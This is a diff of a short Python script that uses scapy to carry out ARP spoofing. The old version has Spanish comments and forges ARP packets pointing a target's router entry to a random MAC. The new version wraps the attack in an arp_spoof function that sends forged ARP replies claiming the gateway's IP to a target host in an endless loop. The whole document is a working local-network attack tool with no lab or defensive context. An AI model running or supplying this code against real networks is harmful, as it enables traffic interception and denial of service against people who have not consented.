@@ -1,17 +1,23 @@
-import scapy.all as scapy
+from scapy.all import ARP, getmacbyip, send
 import time
 
-# Definir las direcciones IP del objetivo y del router
-objetivo_ip = "192.168.122.178"  # Reemplazar con la IP real del objetivo
-router_ip = "192.168.122.1"  # Reemplazar con la IP real del router
 
-# Enviar paquetes ARP falsos al objetivo
-while True:
-    # Crear un paquete ARP falso que asocia la dirección MAC del atacante a la IP del router
-    paquete_arp = scapy.ARP(psrc=router_ip, pdst=objetivo_ip, hwdst=scapy.RandMAC())
+def arp_spoof(target_ip, gateway_ip, iface):
+  target_mac = getmacbyip(target_ip)
+  if not target_mac:
+    print(f"Could not find target MAC address for IP: {target_ip}")
+    return
 
-    # Enviar el paquete ARP falso al objetivo
-    scapy.send(paquete_arp, verbose=False)
+  packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
 
-    # Esperar un segundo antes de enviar el siguiente paquete
-    time.sleep(1)
+  while True:
+    send(packet, verbose=False)
+    time.sleep(2)
+
+
+if __name__ == "__main__":
+  target_ip = '192.168.0.33'
+  gateway_ip = '192.168.0.1'
+  iface = 'enp1s0'
+
+  arp_spoof(target_ip, gateway_ip, iface)
